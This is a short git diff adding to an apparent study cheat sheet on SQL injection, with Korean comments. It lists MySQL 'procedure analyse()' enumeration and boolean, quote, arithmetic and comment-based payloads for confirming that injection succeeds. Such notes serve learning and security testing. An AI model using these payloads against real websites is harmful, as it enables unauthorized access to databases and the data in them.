@@ -265,3 +265,33 @@ Comment Injection
 
 <br />
 
+Table and Column
+
+```mysql
+select test1 from test where id='admin' and pw='1234' procedure analyse();
+```
+
+-> Use with limit 2,1
+
+<br />
+
+SQL Injection Attack Success
+
+```
+Use '(Single Quoter) Error
+-> ' and '1'='1 , ' and '1'='2
+앞은 정상적 출력되고 뒤는 출력이 안나면 성공
+' or '1'='1 -> 정상 출력 되면 성공
+Number Column
+-> if idx=23001 == idx=23002-1 이렇게 넣었을때 정상 출력 되면 성공
+Comment
+-> #(%23), -- (--%20), %0a
+```
+
+<br />
+
+
+
+
+
+*Reference by ar9ang3*
